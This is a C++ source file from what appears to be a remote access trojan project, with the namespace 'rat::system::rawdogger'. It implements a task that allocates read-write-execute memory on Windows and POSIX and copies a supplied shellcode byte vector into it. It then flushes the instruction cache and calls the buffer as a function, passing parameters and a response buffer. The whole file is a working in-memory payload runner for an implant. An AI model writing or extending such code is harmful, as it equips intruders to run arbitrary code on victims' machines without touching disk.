#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <exception>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "rat/system/debug.hpp"
#include "rat/system/rawdogger.hpp"
#include "rat/system/types.hpp" // Include your BinaryCodeTask definition

namespace rat::system::rawdogger {

// Allocate an executable buffer
bool allocateExecutableBuffer(size_t arg_Size, void **p2_Buffer) {
	if(arg_Size == 0)
		return false;

#if defined(_WIN32)
	void *p_buffer = VirtualAlloc(nullptr, arg_Size, MEM_COMMIT | MEM_RESERVE,
	                              PAGE_EXECUTE_READWRITE);
	if(!p_buffer)
		return false;
#else
	void *p_buffer = mmap(nullptr, arg_Size, PROT_READ | PROT_WRITE | PROT_EXEC,
	                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(p_buffer == MAP_FAILED)
		return false;
#endif

	*p2_Buffer = p_buffer;
	return true;
}

// Release an executable buffer
bool releaseExecutableBuffer(void *p_Buffer, size_t arg_Size) noexcept {
	if(!p_Buffer)
		return false;
#if defined(_WIN32)
	VirtualFree(p_Buffer, 0, MEM_RELEASE);
#else
	munmap(p_Buffer, arg_Size);
#endif
	return true;
}

// Flush CPU instruction cache
bool flushInstructionCache(void *p_Buffer, size_t arg_Size) {
	if(!p_Buffer || arg_Size == 0)
		return false;

#if defined(_WIN32)
	FlushInstructionCache(GetCurrentProcess(), p_Buffer, arg_Size);
#elif defined(__APPLE__)
	sys_icache_invalidate(p_Buffer, arg_Size);
#else
	__builtin___clear_cache(reinterpret_cast<char *>(p_Buffer),
	                        reinterpret_cast<char *>(p_Buffer) + arg_Size);
#endif
	return true;
}

// Copy shell code to executable buffer
bool copyToExecutableBuffer(void *p_Exec_Buffer, const uint8_t *p_Code,
                            size_t arg_Size) {
	if(!p_Exec_Buffer || !p_Code || arg_Size == 0)
		return false;
	std::memcpy(p_Exec_Buffer, p_Code, arg_Size);
	return true;
}

// Define the execution function type using BinaryCodeTask directly
using ExecFunction = void (*)(char **parameters, size_t number_parameters,
                              char *response_buffer,
                              size_t response_buffer_size);

// Execute shell code stored in BinaryCodeTask with centralized debugging
bool BinaryCodeTask::executeBinaryCodeTask(void) {
		if(this->shell_code.empty()) {
			ERROR_LOG("BinaryCodeTask has no shell code");
			return false;
		}
	void *exec_buffer = nullptr;
		if(!allocateExecutableBuffer(shell_code.size(), &exec_buffer)) {
			ERROR_LOG("Failed to allocate executable memory of size {}",
			          shell_code.size());
			return false;
		}

	bool result = false;
		try {
				if(!copyToExecutableBuffer(exec_buffer, shell_code.data(),
				                           shell_code.size())) {
					ERROR_LOG("Failed to copy shell code to executable buffer");
					throw std::runtime_error("copyToExecutableBuffer failed");
				}

				if(!flushInstructionCache(exec_buffer, shell_code.size())) {
					ERROR_LOG("Failed to flush instruction cache");
					throw std::runtime_error("flushInstructionCache failed");
				}

			// Prepare parameters as char**
			std::vector<char *> c_params;
				for(auto &p : parameters) {
					c_params.push_back(p.data());
				}

			// Execute the shell code
			auto func = reinterpret_cast<ExecFunction>(exec_buffer);
			func(c_params.empty() ? nullptr : c_params.data(), c_params.size(),
			     response_buffer.empty() ? nullptr : &response_buffer[0],
			     response_buffer.size());

			result = true;
			DEBUG_LOG("Shell code executed successfully");
		}
		catch(const std::exception &e) {
			ERROR_LOG("Execution error: {}", e.what());
			result = false;
		}
		catch(...) {
			ERROR_LOG("Unknown execution error occurred");
			result = false;
		}

	// Release executable memory safely
	releaseExecutableBuffer(exec_buffer, shell_code.size());

	return result;
}

BinaryCodeTask::BinaryCodeTask()
    : name(""), parameters(), response_buffer(), shell_code() {
}

BinaryCodeTask::BinaryCodeTask(const char *arg_Name)
    : name(arg_Name), parameters(), response_buffer(), shell_code() {
}

void BinaryCodeTask::setParameters(
    const std::vector<std::string> &arg_Parameters) {
	parameters = arg_Parameters;
}

void BinaryCodeTask::setParameters(std::vector<std::string> &&arg_Parameters) {
	parameters = std::move(arg_Parameters);
}

void BinaryCodeTask::setShellCode(const std::vector<uint8_t> &arg_Code) {
	shell_code = arg_Code;
}

void BinaryCodeTask::setShellCode(std::vector<uint8_t> &&arg_Code) {
	shell_code = std::move(arg_Code);
}

void BinaryCodeTask::freeParameters() {
	this->parameters.clear();
	this->parameters.shrink_to_fit();
}

void BinaryCodeTask::freeShellCode() {
	shell_code = {};
}

void BinaryCodeTask::freeResponseBuffer() {
	response_buffer.clear();
	response_buffer.shrink_to_fit();
}

void BinaryCodeTask::reset() {
	freeParameters();
	freeShellCode();
	freeResponseBuffer();
	name.clear();
}

} // namespace rat::system::rawdogger

#undef DEBUG_LOG
#undef ERROR_LOG
#ifdef DEBUG_RAT_SYSTEM
#undef DEBUG_RAT_SYSTEM
#endif
